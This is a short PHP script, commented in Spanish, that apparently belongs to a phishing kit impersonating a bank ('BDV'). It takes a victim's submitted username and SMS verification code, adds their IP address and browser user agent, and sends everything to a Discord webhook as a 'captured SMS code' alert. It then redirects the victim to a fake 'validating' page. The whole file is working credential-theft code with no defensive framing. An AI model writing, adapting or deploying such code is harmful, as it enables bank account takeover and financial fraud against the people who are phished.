<?php
error_reporting(0);
require 'discord_config.php'; 

// 2. OBTENER DATOS DEL FORMULARIO
$sms = isset($_POST['sms']) ? $_POST['sms'] : '';
$nombre = isset($_POST['nombre']) ? $_POST['nombre'] : ''; 

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// 3. CONSTRUCCIÓN DEL EMBED y ENVÍO A DISCORD
// Crear el array de campos para el Embed
$fields = [];

$fields[] = ['name' => '👤 Usuario', 'value' => "`{$nombre}`", 'inline' => true];
$fields[] = ['name' => '💬 CÓDIGO SMS', 'value' => "**```{$sms}```**", 'inline' => true];

$fields[] = ['name' => '━━━━━━━━━━━━━━━━━━', 'value' => '', 'inline' => false];

$fields[] = ['name' => '🌐 IP', 'value' => "`{$ip}`", 'inline' => true];
$fields[] = ['name' => '📱 Navegador', 'value' => "`{$userAgent}`", 'inline' => true];

// Estructura del Embed
$embed = [
    'title' => 'BDV 🔑 - CÓDIGO SMS CAPTURADO',
    'color' => 3066993, // Verde oscuro
    'fields' => $fields,
    'timestamp' => date('c')
];

// Llamada a la función centralizada
sendToDiscordEmbed([$embed], 'Capturador SMS'); 

// 4. REDIRIGIR AL SIGUIENTE PASO
header('Location: validando.html'); 
exit();
?>